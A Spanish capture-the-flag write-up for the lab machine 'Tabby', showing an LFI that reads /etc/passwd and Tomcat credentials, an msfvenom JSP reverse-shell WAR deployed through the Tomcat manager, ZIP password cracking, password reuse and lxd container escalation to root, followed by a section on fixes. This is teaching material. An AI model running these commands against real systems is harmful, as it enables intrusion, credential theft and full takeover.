Resumen

Tabby es una cadena completa y muy didáctica: un LFI que filtra credenciales, esas credenciales desplegando un WAR en Tomcat, reutilización de contraseñas para saltar de usuario y, al final, el grupo lxd, que es root disfrazado.

Vulnerabilidad

Local File Inclusion (LFI)

Un parámetro de la web (file) se usa sin sanear para incluir ficheros, lo que permite leer rutas arbitrarias del sistema con ../ y, entre ellas, el fichero de configuración de Tomcat con sus credenciales.

Abuso del grupo lxd

Pertenecer al grupo lxd permite crear contenedores. Un contenedor privilegiado puede montar el sistema de ficheros del anfitrión y leerlo/escribirlo como root: es una escalada directa, no una vulnerabilidad de software.

Reconocimiento

Búsqueda de puertos abiertos en la máquina víctima

┌──(jaime㉿kali)-[~]└─$ sudo nmap -p- -Pn -sS -n --max-retries 1 tabby
PuertoServicioVersión

80httpApache httpd 2.4.41

Un 22, un 80 con Apache y un 8080 con Tomcat. El 80 muestra la web de Mega Hosting.

Enumeración

En la portada del 80 hay un aviso de brecha con un enlace a news.php?file=statement, y aparece el dominio megahosting.htb, que añadimos al /etc/hosts. El parámetro file tiene una pinta inmejorable, así que probamos a salir del directorio

┌──(jaime㉿kali)-[~]└─$ curl "http://megahosting.htb/news.php?file=../../../../etc/passwd"
...ash:x:1000:1000:...:/home/ash:/bin/bash

LFI confirmado. Con él leemos el tomcat-users.xml (en Tomcat 9 por paquete de Ubuntu vive en /usr/share/tomcat9/etc/)

┌──(jaime㉿kali)-[~]└─$ curl "http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml"
<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>

Credenciales de Tomcat: tomcat / $3cureP4s5w0rd123!. Ojo: el rol es manager-script, así que no entramos por el navegador, pero sí por la interfaz de texto del gestor.

Explotación

Generamos un WAR con una shell inversa y lo desplegamos con el comando deploy de la interfaz de texto del gestor

┌──(jaime㉿kali)-[~]└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.X LPORT=443 -f war -o shell.war
┌──(jaime㉿kali)-[~]└─$ curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file shell.war "http://tabby:8080/manager/text/deploy?path=/shell"
OK - Deployed application at context path [/shell]

Visitamos la aplicación desplegada con el listener preparado y entramos como el usuario de Tomcat

tomcat@tabby:/var/lib/tomcat9$ whoami tomcat

Movimiento lateral

Rebuscando por el sistema aparece un backup comprimido fuera de sitio

tomcat@tabby:/var/www/html/files$ ls 16162020_backup.zip

Está cifrado, así que lo pasamos a formato de John y lo rompemos

┌──(jaime㉿kali)-[~]└─$ zip2john 16162020_backup.zip > hash.txt
┌──(jaime㉿kali)-[~]└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
admin@it (16162020_backup.zip)

La contraseña del ZIP es admin@it. El contenido no aporta gran cosa, pero la contraseña sí: probamos la reutilización con el usuario del sistema

tomcat@tabby:~$ su ash Password: admin@it ash@tabby:~$ whoami ash

Escalada de privilegios

Lo primero, mirar los grupos del usuario

ash@tabby:~$ id uid=1000(ash) ... groups=...,116(lxd)

Estamos en el grupo lxd. Construimos (o importamos) una imagen mínima de Alpine y creamos un contenedor privilegiado montando el disco del anfitrión

ash@tabby:~$ lxc image import ./alpine.tar.gz --alias alpine ash@tabby:~$ lxc init alpine escalada -c security.privileged=true ash@tabby:~$ lxc config device add escalada host-root disk source=/ path=/mnt/root recursive=true ash@tabby:~$ lxc start escalada ash@tabby:~$ lxc exec escalada /bin/sh

La clave es security.privileged=true: dentro del contenedor somos root sobre todo el disco del anfitrión, montado en /mnt/root

~ # whoami root

Flags

┌──(jaime㉿kali)-[~]└─$ cat /home/ash/user.txt
┌──(jaime㉿kali)-[~]└─$ cat /root/root.txt

Cómo se arregla

La cadena nace de un LFI y de una pertenencia a grupo peligrosa, así que el arreglo va por capas:

  • Corregir el LFI: validar y limitar el parámetro file a una lista blanca de ficheros; nunca concatenar entrada del usuario en una ruta.
  • Proteger las credenciales de Tomcat: no dejar tomcat-users.xml accesible y usar contraseñas robustas; restringir el rol manager-script.
  • No reutilizar contraseñas: la del ZIP abría la cuenta del sistema. Credenciales distintas por servicio habrían cortado el movimiento lateral.
  • Sacar usuarios del grupo lxd: pertenecer a lxd (igual que docker o disk) equivale a ser root. Solo administradores de confianza deberían estar en él.

Conclusiones

Un LFI no es "solo leer ficheros": vale exactamente lo que valga el fichero más sensible al que llegues. Aquí, las credenciales de Tomcat.

Conviene conocer las rutas de configuración según la instalación: en Tomcat 9 por paquete de Ubuntu, tomcat-users.xml no está donde dice la documentación oficial. Y el rol manager-script basta para desplegar un WAR aunque el panel web esté cerrado.

La reutilización de contraseñas sigue siendo uno de los movimientos laterales más rentables, y los grupos lxd, docker y disk equivalen a root: revisa siempre id nada más conseguir un usuario.
